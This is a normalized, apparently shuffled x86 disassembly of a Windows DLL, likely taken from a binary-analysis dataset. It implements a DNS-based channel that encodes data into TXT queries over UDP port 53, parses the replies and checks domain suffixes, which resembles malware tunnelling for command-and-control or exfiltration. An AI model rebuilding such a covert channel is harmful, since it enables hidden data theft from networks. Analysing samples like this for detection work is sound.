push 0x35
push [ esi + 0x320f8 ]
xor ebx ebx
push ebx
push [ ebp - 0x8 ]
push [ ebp - 0x24 ]
push [ ebp - 0xc ]
call sub_100027e3
mov edi eax
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
call [ free@IAT ]
and [ ebp - 0x8 ] 0x0
pop ecx
jg r-xdata
test edi edi
jg r-xdata
cmp ebx 0x64
jbe r-xdata
cmp edi [ esi + 0x20 ]
jae r-xdata
mov edx edi
call sub_100031ee
push [ ebp - 0x18 ]
call [ free@IAT ]
pop ecx
dec edi
call sub_100031ee
or [ ebp - 0x10 ] 0xffffffff
cmp [ edi + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
inc [ esi + 0x19040 ]
call sub_10001e69
push 0x10
mov [ ebp - 0x38 ] eax
lea eax [ edi + 0x10 ]
push eax
push ebx
push [ edi + 0x48 ]
lea eax [ edi + 0x4c ]
push eax
push [ esi + 0x320ac ]
mov [ ebp - 0x34 ] edx
call [ sendto@IAT ]
push ebx
call [ _time64@IAT ]
inc [ edi + 0x4 ]
pop ecx
add esi 0x19014
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] edx
call sub_1000325b
test al al
je r-xdata
sub eax [ ebp - 0x38 ]
sbb edx [ ebp - 0x34 ]
test edx edx
jg r-xdata
cmp ebx 0x1f4
jbe r-xdata
jl r-xdata
mov edx [ ebp - 0x10 ]
mov esi ebx
call sub_1000279c
mov esi [ ebp - 0x14 ]
push [ ebp - 0xc ]
call [ free@IAT ]
pop ecx
mov eax [ esi + 0x20 ]
mov ecx [ esi + 0x1c ]
mov [ ecx + eax * 4 ] edi
inc [ esi + 0x20 ]
jl r-xdata
test edi edi
jl r-xdata
test edi edi
jg r-xdata
mov esi eax
sub esi [ ebp - 0x38 ]
mov ecx edx
sbb ecx [ ebp - 0x34 ]
test ecx ecx
jg r-xdata
cmp ebx 0x1f4
ja r-xdata
cmp eax 0x1388
ja r-xdata
jg r-xdata
jl r-xdata
jl r-xdata
cmp ebx 0xbb8
jbe r-xdata
mov esi eax
sub esi [ ebp - 0x38 ]
mov ecx edx
sbb ecx [ ebp - 0x34 ]
test ecx ecx
jg r-xdata
cmp ebx 0xbb8
ja r-xdata
cmp esi 0xc8
ja r-xdata
test edi edi
jl r-xdata
test edi edi
jg r-xdata
jl r-xdata
jg r-xdata
jl r-xdata
cmp esi 0x3e8
ja r-xdata
cmp ebx 0x2710
jbe r-xdata
mov esi eax
sub esi [ ebp - 0x38 ]
mov ecx edx
sbb ecx [ ebp - 0x34 ]
test ecx ecx
jg r-xdata
cmp ebx 0x1770
ja r-xdata
jl r-xdata
cmp esi 0x7d0
ja r-xdata
sub_10002294
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
xor edi edi
push edi
call [ _time64@IAT ]
mov esi [ ebp + 0x8 ]
pop ecx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] edx
jmp r-xdata
cmp [ esi + 0x32104 ] edi
je r-xdata
cmp [ esi + 0x32100 ] edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
leave
retn 0x4
push edi
push [ esi + 0x320ac ]
push 0x64
call sub_100072aa
add esp 0xc
test eax eax
je r-xdata
xor edi edi
push edi
call [ _time64@IAT ]
sub eax [ ebp - 0x40 ]
pop ecx
sbb edx [ ebp - 0x3c ]
cmp edx edi
jg r-xdata
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push [ esi + 0x320ac ]
lea ebx [ ebp - 0x30 ]
lea edi [ ebp - 0x4 ]
mov ecx esi
call sub_10002881
test eax eax
je r-xdata
xor eax eax
inc eax
mov [ esi + 0x32100 ] eax
mov [ esi + 0x32104 ] eax
mov [ esi + 0x4 ] 0x5b4
jl r-xdata
mov edi [ ebp - 0x4 ]
mov eax [ edi ]
cmp eax [ esi + 0x320fc ]
jne r-xdata
cmp eax 0x3c
ja r-xdata
push 0x0
call [ _time64@IAT ]
mov ebx [ EnterCriticalSection@IAT ]
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ esi + 0x19044 ]
pop ecx
push eax
mov [ ebp - 0x3c ] edx
mov [ ebp - 0xc ] eax
call ebx
xor edx edx
cmp [ esi + 0x19034 ] edx
jbe r-xdata
push [ ebp - 0xc ]
call [ LeaveCriticalSection@IAT ]
lea eax [ esi + 0x32094 ]
push eax
mov [ ebp - 0x10 ] eax
call ebx
xor eax eax
cmp [ edi + 0x4 ] eax
jne r-xdata
lea eax [ esi + 0x19014 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov edx [ edi + 0x8 ]
cmp edx [ esi + 0x32064 ]
jb r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp edx [ eax + 0x20 ]
jae r-xdata
cmp [ edi + 0xc ] eax
jne r-xdata
cmp [ edi + 0xc ] eax
je r-xdata
push [ ebp - 0x10 ]
call [ LeaveCriticalSection@IAT ]
push [ ebp - 0xc ]
call ebx
xor eax eax
cmp [ ebp - 0x8 ] eax
je r-xdata
inc edx
cmp edx [ esi + 0x19034 ]
jb r-xdata
mov eax [ eax + 0x1c ]
mov edi [ eax + edx * 4 ]
mov eax [ edi + 0x3c ]
mov ecx [ ebp - 0x4 ]
cmp eax [ ecx + 0x10 ]
jae r-xdata
push [ ebp - 0x10 ]
or [ ebp - 0x8 ] 0xffffffff
call [ LeaveCriticalSection@IAT ]
push [ ebp - 0xc ]
call ebx
xor ecx ecx
mov [ ebp - 0x18 ] ecx
cmp ecx [ esi + 0x19034 ]
jae r-xdata
mov [ ebp - 0x8 ] 0x1
cmp [ esi + 0x32088 ] eax
jbe r-xdata
mov [ ebp - 0x20 ] eax
cmp eax [ esi + 0x19034 ]
jb r-xdata
call sub_100026de
and [ ebp - 0x18 ] 0x0
and [ ebp - 0x2c ] 0x0
mov esi eax
mov eax [ edi + 0x4 ]
mov edi [ esi + 0xc ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
add eax 0x320b4
push eax
push [ ebp - 0x30 ]
mov [ ebp - 0x20 ] esi
push [ ebp - 0x4 ]
add edi 0x14
call sub_10002a9f
test eax eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov edi [ ebp - 0x4 ]
mov esi [ ebp - 0x10 ]
call sub_100031ee
push edi
call [ free@IAT ]
mov esi [ ebp + 0x8 ]
pop ecx
or edx 0xffffffff
and [ ebp - 0x8 ] 0x0
mov eax [ esi + 0x19030 ]
mov eax [ eax + ecx * 4 ]
mov edx [ eax + 0x3c ]
cmp [ ebp - 0x8 ] edx
jbe r-xdata
mov edi [ esi + 0x32088 ]
cmp eax edi
jae r-xdata
mov ecx [ esi + 0x19030 ]
mov edi [ ecx + eax * 4 ]
mov ecx [ edi + 0x24 ]
mov edx [ ebp - 0x4 ]
cmp ecx [ edx + 0x4 ]
jne r-xdata
push [ ebp - 0xc ]
call [ LeaveCriticalSection@IAT ]
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push esi
call [ free@IAT ]
mov esi [ ebp + 0x8 ]
mov edi [ ebp - 0x4 ]
pop ecx
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push edi
push esi
call sub_10002bf6
push [ ebp - 0x1c ]
mov edi eax
call [ free@IAT ]
pop ecx
test edi edi
je r-xdata
xor eax eax
cmp [ ebp - 0x18 ] eax
sete al
mov [ ebp - 0x8 ] eax
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
cmp edx [ eax + 0x38 ]
jne r-xdata
mov [ ebp - 0x8 ] edx
inc eax
cmp eax edi
jb r-xdata
mov ecx [ esi + 0x32084 ]
mov ecx [ ecx + eax * 4 ]
cmp edx [ ecx + 0x8 ]
je r-xdata
mov edi [ ebp - 0x4 ]
inc eax
push [ ebp - 0x24 ]
lea ebx [ edi + 0x4c ]
call [ htons@IAT ]
push [ ebp - 0x28 ]
mov [ ebx ] ax
call [ htons@IAT ]
push 0x10
mov [ edi + 0x12 ] ax
lea eax [ edi + 0x10 ]
push eax
push 0x0
push [ edi + 0x48 ]
push ebx
push [ esi + 0x320ac ]
call [ sendto@IAT ]
push 0x0
call [ _time64@IAT ]
inc [ edi + 0x4 ]
mov ebx [ EnterCriticalSection@IAT ]
mov [ edi + 0x8 ] eax
mov eax [ ebp - 0x20 ]
pop ecx
mov [ edi + 0xc ] edx
cmp [ edi + 0xc ] 0x0
je r-xdata
push [ ebp - 0x28 ]
push [ ebp - 0x34 ]
push esi
push [ ebp - 0x4 ]
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
call sub_100027e3
mov edi eax
test edi edi
je r-xdata
push [ ebp - 0xc ]
call [ LeaveCriticalSection@IAT ]
push [ ebp - 0x10 ]
call ebx
inc ecx
cmp ecx [ esi + 0x19034 ]
jb r-xdata
mov [ ebp - 0x18 ] 0x1
jmp r-xdata
and [ ebp - 0x8 ] 0x0
push [ ebp - 0x10 ]
call ebx
add esi 0x32068
push edi
mov [ ebp - 0x2c ] esi
call sub_1000315c
mov ebx [ ebp + 0x8 ]
xor edx edx
cmp [ ebx + 0x32088 ] edx
jbe r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x10
lea eax [ edi + 0x10 ]
push eax
push 0x0
push [ edi + 0x48 ]
lea eax [ edi + 0x4c ]
push eax
push [ esi + 0x320ac ]
call [ sendto@IAT ]
push 0x0
call [ _time64@IAT ]
inc [ edi + 0x4 ]
pop ecx
add esi 0x19014
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] edx
call sub_1000325b
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov edi [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x10 ]
call [ LeaveCriticalSection@IAT ]
mov esi ebx
cmp edx [ esi + 0x20 ]
jae r-xdata
push [ ebp - 0x14 ]
call [ free@IAT ]
pop ecx
mov esi [ ebp - 0x20 ]
mov ecx [ esi + 0x20 ]
mov eax [ esi + 0x1c ]
shl ecx 0x2
push ecx
push eax
add eax 0x4
push eax
call [ memmove@IAT ]
mov eax [ esi + 0x1c ]
add esp 0xc
mov [ eax ] edi
inc [ esi + 0x20 ]
mov eax [ ebp - 0x8 ]
cmp [ edi + 0x10 ] eax
jae r-xdata
inc edx
cmp edx [ ebx + 0x32088 ]
jb r-xdata
mov eax [ esi + 0x1c ]
mov edi [ eax + edx * 4 ]
mov eax [ edi + 0x8 ]
mov [ ebp - 0x4 ] edi
cmp eax [ ebx + 0x32064 ]
jne r-xdata
mov eax 0x19000
sub eax [ ebx + 0x32060 ]
cmp eax [ edi + 0xc ]
jb r-xdata
call sub_100031ee
or [ ebp - 0x20 ] 0xffffffff
mov esi ebx
call sub_1000279c
mov esi [ ebp - 0x2c ]
mov edx [ ebp - 0x20 ]
sub_100026de
push ebx
mov ebx [ esi + 0x1900c ]
push edi
cmp ebx 0x7f
jb r-xdata
test ebx ebx
je r-xdata
push 0x7f
pop ebx
jmp r-xdata
push 0x14
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebx + 0x14 ]
push eax
call [ malloc@IAT ]
mov edi eax
pop ecx
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebx
retn
mov eax [ esi + 0x320fc ]
mov [ edi ] eax
mov eax [ esi + 0x19010 ]
and [ edi + 0xc ] 0x0
mov [ edi + 0x8 ] eax
mov eax [ esi + 0x32064 ]
mov [ edi + 0x10 ] eax
mov eax [ esi + 0x320fc ]
mov [ edi ] eax
mov eax [ esi + 0x19010 ]
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] ebx
mov eax [ esi + 0x32064 ]
mov [ edi + 0x10 ] eax
lea eax [ esi + 0xc ]
push ebx
push eax
lea eax [ edi + 0x14 ]
push eax
call [ memcpy@IAT ]
mov eax [ esi + 0x1900c ]
sub eax ebx
push eax
lea eax [ ebx + esi + 0xc ]
push eax
lea eax [ esi + 0xc ]
push eax
call [ memmove@IAT ]
sub [ esi + 0x1900c ] ebx
add [ esi + 0x19010 ] ebx
add esp 0x18
push [ esi + 0x1905c ]
call [ SetEvent@IAT ]
jmp r-xdata
sub_1000279c
push ebx
push [ edi + 0xc ]
lea eax [ edi + 0x14 ]
push eax
mov eax [ esi + 0x32060 ]
lea eax [ esi + eax + 0x19060 ]
push eax
call [ memcpy@IAT ]
mov eax [ edi + 0xc ]
add [ esi + 0x32060 ] eax
mov eax [ edi + 0xc ]
add [ esi + 0x32064 ] eax
add esp 0xc
push [ esi + 0x32090 ]
call [ SetEvent@IAT ]
push edi
call [ free@IAT ]
pop ecx
pop ebx
retn
sub_100027e3
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
lea esi [ edi + 0x50 ]
push esi
call [ malloc@IAT ]
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x18
push esi
push 0x0
push ebx
call [ memset@IAT ]
push 0x0
call [ _time64@IAT ]
mov esi [ htons@IAT ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0xc ] edx
mov [ ebx + 0x48 ] edi
movzx eax [ eax ]
add esp 0x10
push eax
call esi
and [ ebx + 0x4 ] 0x0
push 0x2
mov [ ebx ] ax
pop eax
push [ ebp + 0x1c ]
mov [ ebx + 0x10 ] ax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x14 ] eax
call esi
mov esi [ ebp + 0x10 ]
mov [ ebx + 0x12 ] ax
test esi esi
je r-xdata
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
push 0x5
lea edi [ ebx + 0x20 ]
pop ecx
[ edi ] [ esi ]
push [ ebp + 0xc ]
lea eax [ ebx + 0x4c ]
push [ ebp + 0x8 ]
push eax
call [ memcpy@IAT ]
add esp 0xc
push 0x5
lea edi [ ebx + 0x34 ]
pop ecx
[ edi ] [ esi ]
sub_10002881
push ebp
mov ebp esp
mov eax 0x102c
call sub_10014ee0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
and [ ebp - 0x101c ] 0x0
mov [ ebp - 0x1024 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov [ ebp - 0x1020 ] eax
mov eax [ ebp + 0x14 ]
push 0x10
mov [ ebp - 0x1028 ] eax
pop eax
push eax
mov [ ebp - 0x102c ] eax
lea eax [ ebp - 0x1018 ]
push 0x0
push eax
mov esi ecx
call [ memset@IAT ]
add esp 0xc
lea eax [ ebp - 0x102c ]
push eax
lea eax [ ebp - 0x1018 ]
push eax
push 0x0
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
push [ ebp + 0x8 ]
call [ recvfrom@IAT ]
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x101c ]
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0x10
cmp eax 0xc
jbe r-xdata
push [ ebp - 0x1024 ]
add esi 0x320b4
push ebx
push edi
push esi
mov edx eax
lea ecx [ ebp - 0x1008 ]
call sub_10002d46
test eax eax
je r-xdata
mov eax [ ebp - 0x1014 ]
mov ecx [ ebp - 0x1020 ]
push [ ebp - 0x1016 ]
mov [ ecx ] eax
call [ ntohs@IAT ]
mov ecx [ ebp - 0x1028 ]
movzx eax ax
mov [ ecx ] eax
mov [ ebp - 0x101c ] 0x1
sub_1000296c
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
lea edx [ ebp - 0x1c ]
push edx
lea edx [ ebp - 0x18 ]
push edx
xor esi esi
push esi
add eax 0x320b4
push eax
push 0x14
push ecx
xor edi edi
mov [ ebp - 0x1c ] esi
call sub_10002a9f
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_10014571
leave
retn 0xc
push 0x10
lea eax [ ebp - 0x14 ]
push esi
push eax
call [ memset@IAT ]
add esp 0xc
push 0x2
pop eax
mov [ ebp - 0x14 ] ax
mov eax [ ebp + 0x10 ]
push 0x35
mov [ ebp - 0x10 ] eax
call [ htons@IAT ]
push 0x10
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x14 ]
push eax
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x18 ]
push [ ebp + 0xc ]
call [ sendto@IAT ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
cmp [ ebp - 0x18 ] esi
je r-xdata
inc edi
push [ ebp - 0x18 ]
call [ free@IAT ]
pop ecx
sub_10002a09
push esi
push edi
mov edi eax
mov eax ebx
lea esi [ ebx + 0x1 ]
mov [ eax ] cl
cmp [ edi ] 0x2e
movsx ecx cl
lea eax [ eax + ecx + 0x1 ]
lea esi [ eax + 0x1 ]
jne r-xdata
mov dl [ edi ]
cmp dl 0x2e
je r-xdata
xor cl cl
inc edi
jmp r-xdata
test dl dl
je r-xdata
movsx edx cl
pop edi
mov [ eax ] cl
lea eax [ eax + edx + 0x1 ]
pop esi
test cl cl
je r-xdata
mov [ esi ] dl
inc esi
inc edi
inc cl
jmp r-xdata
sub eax ebx
retn
mov [ eax ] 0x0
inc eax
cmp cl 0x3f
je r-xdata
sub_10002a56
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
add eax esi
xor ebx ebx
mov [ ebp - 0x4 ] eax
cmp esi eax
jae r-xdata
pop esi
mov eax ebx
pop ebx
leave
retn 0x4
push edi
pop edi
movzx edi al
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea esi [ esi + edi + 0x1 ]
add ebx edi
cmp esi [ ebp - 0x4 ]
jb r-xdata
push edi
lea ecx [ esi + 0x1 ]
push ecx
add eax ebx
push eax
call [ memmove@IAT ]
add esp 0xc
mov al [ esi ]
test al al
je r-xdata
sub_10002a9f
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x3
add eax 0x2
xor edx edx
pop ecx
div ecx
push 0x3f
pop ecx
xor edx edx
push [ ebp + 0x10 ]
mov ebx [ strlen@IAT ]
and [ ebp - 0x8 ] 0x0
mov edi eax
lea eax [ edi * 4 + 0x3e ]
div ecx
mov [ ebp - 0x4 ] eax
call ebx
add eax [ ebp - 0x4 ]
lea eax [ eax + edi * 4 + 0x12 ]
push eax
call [ malloc@IAT ]
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
leave
retn 0x18
push [ ebp + 0x10 ]
call ebx
add eax [ ebp - 0x4 ]
lea eax [ eax + edi * 4 + 0x12 ]
push eax
push 0x0
push esi
call [ memset@IAT ]
add esp 0x10
push [ ebp + 0x14 ]
call [ htons@IAT ]
mov [ esi ] ax
xor eax eax
inc eax
push eax
mov [ esi + 0x2 ] ax
call [ htons@IAT ]
push [ ebp + 0x10 ]
mov [ esi + 0x4 ] ax
xor eax eax
mov [ esi + 0x6 ] ax
mov [ esi + 0x8 ] ax
mov [ esi + 0xa ] ax
call ebx
lea eax [ eax + edi * 4 + 0x2 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov [ ebp + 0x14 ] eax
test eax eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
push [ ebp + 0x10 ]
call ebx
lea eax [ eax + edi * 4 + 0x2 ]
push eax
push 0x0
push [ ebp + 0x14 ]
call [ memset@IAT ]
push [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_100076da
mov ebx [ strcat@IAT ]
push r--data
push [ ebp + 0x14 ]
call ebx
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
call ebx
mov eax [ ebp + 0x14 ]
add esp 0x24
lea ebx [ esi + 0xc ]
call sub_10002a09
push 0x10
lea ebx [ eax + esi ]
call [ htons@IAT ]
push 0x1
mov [ ebx + 0xc ] ax
call [ htons@IAT ]
push [ ebp + 0x14 ]
mov [ ebx + 0xe ] ax
call [ free@IAT ]
mov eax [ ebp + 0x18 ]
push [ ebp + 0x10 ]
mov [ eax ] esi
call [ strlen@IAT ]
add eax [ ebp - 0x4 ]
pop ecx
pop ecx
mov ecx [ ebp + 0x1c ]
lea eax [ eax + edi * 4 + 0x12 ]
mov [ ecx ] eax
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
sub_10002bf6
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0xc ] 0x0
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebx + 0xc ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
movsx ecx cl
lea eax [ eax + ecx + 0x1 ]
sub eax ebx
lea edi [ eax + 0x5 ]
mov eax [ ebp + 0xc ]
add eax 0x2
push 0x3
pop ecx
xor edx edx
div ecx
push 0x3f
xor edx edx
pop esi
mov ecx eax
mov [ ebp - 0x10 ] eax
shl ecx 0x2
lea eax [ ecx + 0x3e ]
div esi
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] eax
add eax ecx
lea eax [ eax + edi + 0xd ]
push eax
mov [ ebp - 0x8 ] eax
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
leave
retn 0x10
push [ ebp - 0x8 ]
push 0x0
push esi
call [ memset@IAT ]
push edi
push ebx
push esi
call [ memcpy@IAT ]
mov ax [ ebx ]
mov ebx [ htons@IAT ]
add esp 0x18
mov [ esi ] ax
mov eax 0x8081
push 0x1
mov [ esi + 0x2 ] ax
call ebx
push 0x1
mov [ esi + 0x4 ] ax
call ebx
mov [ esi + 0x6 ] ax
xor eax eax
push 0xc00c
mov [ esi + 0x8 ] ax
mov [ esi + 0xa ] ax
add edi esi
call ebx
push 0x10
mov [ edi ] ax
call ebx
push 0x1
mov [ edi + 0x2 ] ax
call ebx
push 0x3c
mov [ edi + 0x4 ] ax
call [ htonl@IAT ]
mov ecx [ ebp - 0x10 ]
mov [ edi + 0x6 ] eax
mov eax [ ebp - 0x4 ]
lea eax [ eax + ecx * 4 + 0x1 ]
push eax
call ebx
mov ebx [ ebp - 0x14 ]
inc ebx
push ebx
mov [ edi + 0xa ] ax
call [ malloc@IAT ]
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
push esi
call [ free@IAT ]
pop ecx
push ebx
push 0x0
push eax
call [ memset@IAT ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_100076da
mov eax [ ebp - 0x4 ]
add esp 0x10
lea ebx [ edi + 0xc ]
call sub_10002a09
push [ ebp - 0x4 ]
call [ free@IAT ]
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x14 ]
mov [ eax ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub_10002d46
push 0xb8
push r--data
call sub_10014f80
mov edi ecx
mov [ ebp - 0xbc ] edi
mov eax [ ebp + 0xc ]
mov [ ebp - 0xb0 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xac ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xa8 ] eax
xor ebx ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0x4 ] ebx
movzx eax [ edi + 0x2 ]
test al al
js r-xdata
test eax 0xf00
jne r-xdata
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0xa4 ] ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003113
mov eax [ ebp - 0xb8 ]
call sub_10014fc8
retn 0x10
lea eax [ edi + 0xc ]
mov [ ebp - 0xa4 ] eax
mov [ ecx ] al
inc ecx
mov [ ebp - 0xa4 ] ecx
inc [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
inc [ ebp + 0x8 ]
jmp r-xdata
inc eax
mov [ ebp - 0xa4 ] eax
add eax 0x4
mov [ ebp - 0xa4 ] eax
sub eax edi
add edi eax
push ebx
movzx eax [ edi + 0xa ]
push eax
mov esi [ ntohs@IAT ]
call esi
movzx ebx ax
movzx eax [ edi ]
push eax
call esi
movzx ecx ax
and ecx 0xffff3fff
add ecx edi
mov eax ebx
call sub_10002a56
lea ebx [ eax + 0x1 ]
push ebx
call [ malloc@IAT ]
pop ecx
mov [ ebp - 0xa0 ] eax
test eax eax
jne r-xdata
cmp cl 0x40
jle r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al 0x2e
jne r-xdata
lea eax [ edi + 0xc ]
mov [ ebp - 0xa4 ] eax
push ebx
push 0x0
push eax
call [ memset@IAT ]
add esp 0xc
push [ ebp - 0xa0 ]
movzx eax [ edi + 0xa ]
push eax
call esi
movzx ebx ax
movzx eax [ edi ]
push eax
call esi
movzx ecx ax
and ecx 0xffff3fff
add ecx edi
mov eax ebx
call sub_10002a56
push [ ebp - 0xa0 ]
call [ strlen@IAT ]
shr eax 0x2
imul eax eax 0x3
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0xc8 ] 0xffffffff
push r--data
lea eax [ ebp - 0xc8 ]
jmp r-xdata
movsx ecx cl
lea eax [ eax + ecx + 0x1 ]
mov [ ebp - 0xa4 ] eax
lea ecx [ edi + edx ]
cmp eax ecx
jbe r-xdata
or [ ebp - 0xc0 ] 0xffffffff
push r--data
lea eax [ ebp - 0xc0 ]
jmp r-xdata
inc eax
mov [ ebp - 0xa4 ] eax
add eax 0x4
mov [ ebp - 0xa4 ] eax
sub eax edi
lea esi [ eax - 0x10 ]
lea ecx [ edi + 0xc ]
push ebx
mov eax esi
call sub_10002a56
inc eax
mov [ ebp - 0xa0 ] eax
push eax
call [ malloc@IAT ]
pop ecx
mov ebx eax
test ebx ebx
jne r-xdata
cmp cl 0x40
jle r-xdata
push edi
mov eax [ ebp - 0xa0 ]
call sub_100077c9
mov ebx eax
push [ ebp - 0xa0 ]
call [ free@IAT ]
pop ecx
pop ecx
mov eax [ ebp - 0xb0 ]
mov [ eax ] edi
mov eax [ ebp - 0xac ]
mov [ eax ] ebx
mov eax [ ebp - 0xbc ]
movzx eax [ eax ]
push eax
call esi
push [ ebp - 0xa0 ]
call [ free@IAT ]
or [ ebp - 0xbc ] 0xffffffff
mov [ esp ] r--data
lea eax [ ebp - 0xbc ]
jmp r-xdata
push eax
call _CxxThrowException
mov cl [ eax ]
test cl cl
je r-xdata
or [ ebp - 0xc4 ] 0xffffffff
push r--data
lea eax [ ebp - 0xc4 ]
jmp r-xdata
push [ ebp - 0xa0 ]
push 0x0
push ebx
call [ memset@IAT ]
add esp 0xc
push ebx
mov eax esi
lea ecx [ edi + 0xc ]
call sub_10002a56
lea eax [ ebp - 0x9c ]
push eax
mov esi [ strlen@IAT ]
call esi
pop ecx
mov [ ebp - 0xa0 ] ebx
sub [ ebp - 0xa0 ] eax
lea eax [ ebp - 0x9c ]
push eax
push ebx
call esi
pop ecx
add eax [ ebp - 0xa0 ]
push eax
call [ _stricmp@IAT ]
pop ecx
pop ecx
test eax eax
je r-xdata
or [ ebp - 0xb0 ] 0xffffffff
push r--data
lea eax [ ebp - 0xb0 ]
jmp r-xdata
movsx ecx cl
lea eax [ eax + ecx + 0x1 ]
mov [ ebp - 0xa4 ] eax
lea ecx [ edi + edx ]
cmp eax ecx
jbe r-xdata
or [ ebp - 0xa8 ] 0xffffffff
push r--data
lea eax [ ebp - 0xa8 ]
lea eax [ ebp - 0x9c ]
push eax
call esi
mov [ ebp - 0xa0 ] ebx
sub [ ebp - 0xa0 ] eax
push ebx
call esi
mov ecx [ ebp - 0xa0 ]
mov [ eax + ecx ] 0x0
push ebx
call esi
shr eax 0x2
imul eax eax 0x3
push eax
call [ malloc@IAT ]
add esp 0x10
mov esi eax
test esi esi
jne r-xdata
push ebx
call [ free@IAT ]
or [ ebp - 0xa0 ] 0xffffffff
mov [ esp ] r--data
lea eax [ ebp - 0xa0 ]
jmp r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
or [ ebp - 0xac ] 0xffffffff
push r--data
lea eax [ ebp - 0xac ]
jmp r-xdata
push esi
mov eax ebx
call sub_100077c9
mov [ ebp - 0xb4 ] eax
push ebx
call [ free@IAT ]
pop ecx
pop ecx
mov eax [ ebp - 0xb0 ]
mov [ eax ] esi
mov eax [ ebp - 0xac ]
mov ecx [ ebp - 0xb4 ]
mov [ eax ] ecx
movzx eax [ edi ]
push eax
call [ ntohs@IAT ]
jmp r-xdata
push ebx
call [ free@IAT ]
or [ ebp - 0xb4 ] 0xffffffff
mov [ esp ] r--data
lea eax [ ebp - 0xb4 ]
jmp r-xdata
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] ax
mov [ ebp - 0xb8 ] 0x1
sub_10003114
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
call [ DeleteCriticalSection@IAT ]
mov esi [ esi + 0x1c ]
test esi esi
je r-xdata
pop esi
retn
push esi
call [ free@IAT ]
pop ecx
sub_10003138
push esi
mov esi ecx
lea eax [ esi + 0x4 ]
push eax
mov [ esi ] r--data
